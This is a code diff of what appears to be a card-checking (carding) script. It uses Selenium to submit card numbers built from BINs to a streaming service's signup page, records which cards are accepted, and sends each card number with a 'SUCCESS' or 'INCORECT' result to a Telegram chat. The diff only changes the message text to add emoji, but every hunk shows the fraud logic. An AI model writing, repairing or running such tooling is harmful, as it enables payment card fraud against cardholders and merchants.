@@ -344,17 +344,17 @@ def check_general_form_one(driver,caed_ar):
 		url_get_text=URL_BUTTON.text
 
 		if "chosen your Stan plan" in url_get_text:
-			telegram_msg="SUCCESS "+extract_bin+card_number
+			telegram_msg="SUCCESS :white_check_mark "+extract_bin+card_number
 			add_to_last_bin()
-			# msg_text="SUCCESS ["+caed_ar[0]+" ]"
+			# msg_text="SUCCESS :white_check_mark ["+caed_ar[0]+" ]"
 			save_successed_bin(caed_ar[0])
 			send_msg(telegram_msg)
 			end_success(driver)
 			# fill_form_tow(driver,url_get_text)
 
 		if "try again." in url_get_text:
-			# msg_text="INCORECT  ["+caed_ar[0]+" ]"
-			telegram_msg="INCORECT "+extract_bin+card_number
+			# msg_text="INCORECT :interrobang  :interrobang   ["+caed_ar[0]+" ]"
+			telegram_msg="INCORECT :interrobang  "+extract_bin+card_number
 			add_to_last_bin()
 			send_msg(telegram_msg)
 
@@ -385,7 +385,7 @@ def check_general_form2(driver,caed_ar):
 			fill_form_tow(driver,url_get_text)
 
 		if "try again" in url_get_text:
-			telegram_msg="INCORECT "+extract_bin+card_number
+			telegram_msg="INCORECT :interrobang  "+extract_bin+card_number
 			add_to_last_bin()
 			send_msg(telegram_msg)
 
@@ -399,13 +399,13 @@ def check_general_form2(driver,caed_ar):
 		URL_BUTTON=WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div/div[2]/div[1]/p')))
 		url_get_text=URL_BUTTON.text
 		if "chosen your Stan plan" in url_get_text:
-			telegram_msg="SUCCESS "+extract_bin+card_number
+			telegram_msg="SUCCESS :white_check_mark "+extract_bin+card_number
 			add_to_last_bin()
 			send_msg(telegram_msg)
 			end_success(driver)
 
 		if "try again" in url_get_text:
-			telegram_msg="INCORECT "+extract_bin+card_number
+			telegram_msg="INCORECT   :interrobang  "+extract_bin+card_number
 			add_to_last_bin()
 			send_msg(telegram_msg)
 
